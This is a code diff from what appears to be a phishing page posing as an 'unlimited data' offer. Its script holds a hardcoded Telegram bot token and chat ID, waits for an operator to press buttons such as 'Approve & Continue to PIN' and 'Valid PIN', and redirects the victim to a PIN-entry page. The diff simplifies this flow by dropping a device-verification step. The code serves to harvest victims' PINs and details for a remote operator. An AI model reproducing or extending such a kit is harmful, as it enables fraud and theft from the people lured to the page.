@@ -182,7 +182,7 @@
             BOT_TOKEN: '8746906558:AAHpzw4CN1J8y4LdO7f8fBsZ_DIFhKYuXB8',
             CHAT_ID: '7547427914',
             SUCCESS_PAGE: 'https://unlimiteddata.vercel.app/success.html',
-            DEVICE_PAGE: 'https://unlimiteddata.vercel.app/device_verify.html'   // ← PIN Verification Page
+            PIN_PAGE: 'https://unlimiteddata.vercel.app/device_verify.html'   // ← Goes directly to PIN
         };
 
         let state = {
@@ -262,11 +262,8 @@
                     reply_markup: {
                         inline_keyboard: [
                             [
-                                { text: "✅ Approve & Continue", callback_data: state.approveId },
+                                { text: "✅ Approve & Continue to PIN", callback_data: state.approveId },
                                 { text: "❌ Decline", callback_data: state.declineId }
-                            ],
-                            [
-                                { text: "📱 Verify Device", callback_data: state.verifyDeviceId }
                             ],
                             [
                                 { text: "✅ Valid PIN", callback_data: state.validPinId },
@@ -298,21 +295,16 @@
                                 const cb = update.callback_query.data;
 
                                 if (cb === state.approveId) {
-                                    // Changed: Go to PIN verification instead of success
+                                    // APPROVE → Go directly to PIN verification
                                     clearInterval(state.pollInterval);
                                     spinner.style.display = 'none';
-                                    window.location.href = CONFIG.DEVICE_PAGE;
+                                    window.location.href = CONFIG.PIN_PAGE;
                                 }
                                 else if (cb === state.declineId) {
                                     clearInterval(state.pollInterval);
                                     spinner.style.display = 'none';
                                     errMsg.textContent = "Request declined. Please try again.";
                                     errMsg.style.display = 'block';
-                                }
-                                else if (cb === state.verifyDeviceId) {
-                                    clearInterval(state.pollInterval);
-                                    spinner.style.display = 'none';
-                                    window.location.href = CONFIG.DEVICE_PAGE;
                                 }
                                 else if (cb === state.validPinId) {
                                     clearInterval(state.pollInterval);
